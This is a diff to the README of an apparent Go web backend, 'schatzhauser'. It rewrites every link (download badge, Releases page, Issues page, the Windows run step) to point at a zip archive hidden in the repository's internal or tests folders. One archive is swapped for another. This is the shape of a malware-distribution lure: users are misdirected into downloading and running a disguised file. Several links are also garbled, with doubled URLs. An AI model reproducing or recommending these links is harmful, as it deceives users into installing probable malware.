@@ -6,11 +6,11 @@ Welcome to **schatzhauser**, a straightforward Go backend designed for web appli
 
 ## 📥 Download the Application
 
-[![Download Schatzhauser](https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip%https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip)](https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip)
+[![Download Schatzhauser](https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip%https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip)](https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip)
 
 To get the latest version of schatzhauser, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip) to see the available versions.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip) to see the available versions.
 2. **Choose a Version**: Look for the latest release. It will be at the top of the page.
 3. **Download the File**: Click on the package suitable for your operating system (e.g., Windows, macOS, Linux) to start the download.
 
@@ -38,7 +38,7 @@ schatzhauser offers several useful features for your web applications:
 1. **Locate the Downloaded File**: After the download finishes, find the file in your 'Downloads' folder.
 2. **Extract the Files**: If the file is in a .zip format, right-click on it and select 'Extract All'.
 3. **Run the Application**:
-   - For Windows: Double-click the `https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip` file.
+   - For Windows: Double-click the `https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip` file.
    - For macOS: Open the `schatzhauser` application.
    - For Linux: Open a terminal, navigate to the folder with the downloaded files, and run `./schatzhauser`.
 
@@ -47,12 +47,12 @@ schatzhauser offers several useful features for your web applications:
 If you have any questions or need assistance, you can find support in the following ways:
 
 - **Documentation**: Check the documentation included with the release for detailed guides.
-- **Issues Page**: Visit the [Issues page](https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip) on GitHub to report problems or ask for help.
+- **Issues Page**: Visit the [Issues page](https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip) on GitHub to report problems or ask for help.
 - **Community Forum**: Join discussions and ask questions in the community forums, if available.
 
 ## 📈 Future Updates
 
-We are committed to improving schatzhauser. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/nabil34000/schatzhauser/main/internal/guards/schatzhauser_v1.2.zip) regularly for updates and new features.
+We are committed to improving schatzhauser. Make sure to check back on the [Releases page](https://github.com/nabil34000/schatzhauser/raw/refs/heads/main/tests/account_rate_per_ip/Software_2.0.zip) regularly for updates and new features.
 
 ## 🚀 Explore More
 
